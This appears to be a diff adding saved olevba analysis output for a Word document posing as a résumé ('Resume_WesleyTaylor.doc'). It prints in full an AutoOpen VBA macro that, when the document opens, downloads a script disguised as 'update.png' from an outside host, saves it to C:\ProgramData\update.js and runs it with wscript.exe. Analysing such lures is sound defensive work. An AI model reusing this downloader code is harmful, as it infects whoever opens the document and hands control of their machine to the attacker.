@@ -1,0 +1,32 @@
+olevba 0.60.2 on Python 3.14.7 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Resume_WesleyTaylor.doc
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Resume_WesleyTaylor.doc - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas 
+in file: Resume_WesleyTaylor.doc - OLE stream: 'Macros/VBA/NewMacros'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoOpen()
+
+spath = "C:\ProgramData\"
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
+xHttp.Send
+With bStrm
+    .Type = 1
+    .Open
+    .write xHttp.responseBody
+    .savetofile spath & "\update.js", 2
+End With
+
+Set shell_object = CreateObject("WScript.Shell")
+shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
+
+End Sub
+
